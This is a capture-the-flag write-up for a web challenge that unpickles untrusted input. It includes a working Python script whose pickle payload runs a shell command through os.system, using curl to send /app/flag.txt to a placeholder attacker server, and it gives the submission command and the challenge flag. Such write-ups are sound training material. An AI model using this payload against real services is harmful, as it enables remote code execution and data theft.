# In a Pickle

Oh dear, it seems I'm taking in arbitrary input with the pickle library. Whatever could go wrong?

## Solution

This appliction accepts arbitrarally pickled data at `/vuln`. This means we can execute python code on the server by generating a malicious payload. I used a script to auto generate my payload as shown below.

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('curl -F=@/app/flag.txt <attacker server>')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled).decode('utf-8'))
```

This payload will exfiltrate the flag to an external listening post.

I can then submit the payload via:
`curl -d "pickled=$(python3 gen.py)" http://127.0.0.1:8000/vuln`

flag:
`gigem{c4nt_b3L13v3_1t_4LL_W3NT_WR0NG}`
